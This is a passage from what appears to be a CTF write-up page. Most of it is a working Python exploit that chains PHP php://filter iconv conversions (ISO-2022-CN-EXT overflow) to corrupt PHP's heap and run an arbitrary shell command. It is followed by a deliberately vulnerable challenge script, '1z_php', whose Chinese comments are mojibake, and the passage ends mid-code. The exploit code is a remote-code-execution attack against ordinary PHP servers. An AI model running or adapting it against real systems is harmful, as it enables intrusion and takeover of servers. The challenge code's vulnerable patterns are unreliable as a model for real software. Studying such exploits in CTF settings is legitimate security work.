operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        <span class="token comment"># This chunk will eventually overwrite mm_heap->free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>        <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="justread.png" loading="lazy"></p><p><img src="justread2.png" loading="lazy"></p><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php"></a>1z_php</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># ÊàëËÆ∞ÂæóÂ•π...Â•ΩÂÉèÂè´flag.phpÂêßÔºü</span><span class="token variable">$emp</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_m.p'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$try</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'try'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token operator">!=</span><span class="token string double-quoted-string">"114514"</span><span class="token operator">&amp;&amp;</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ctype_alpha</span><span class="token punctuation">(</span><span class="token variable">$emp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†‰∏çÊòØhackerÔºüÈÇ£ËØ∑ÂéªÂ§ñÂú∫Á≠âÂÄôÔºÅ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Âè™ÊúâÁúüÊ≠£ÁöÑhackerÊâçËÉΩÊãøÂà∞flagÔºÅ"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?HACKER/is'</span><span class="token punctuation">,</span><span class="token variable">$try</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†ÊòØhackerËøòÊï¢Ëá™Êä•ÂÆ∂Èó®Âë¢Ôºü"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$try</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'HACKER'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"‰Ω†ËøûËá™Â∑±ÊòØhackerÈÉΩ‰∏çÊâøËÆ§ÔºåËøòÊÉ≥Ë¶ÅflagÂë¢Ôºü"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Êî∂ÊâãÂêßhackerÔºå‰Ω†Âæó‰∏çÂà∞flagÁöÑÔºÅ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"114514Âà∞Â∫ïÊòØÂï•ÊÑèÊÄùÂòûÔºü„ÄÇÔºü"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment"># ËßâÂæóÂõ∞ÈöæÁöÑËØùÂ∞±Áõ¥Êé•ÊääshellÊãøÂéªÁî®ÂêßÔºå‰∏çÁî®Ë∞¢~</span><span class="token variable">$shell</span><span 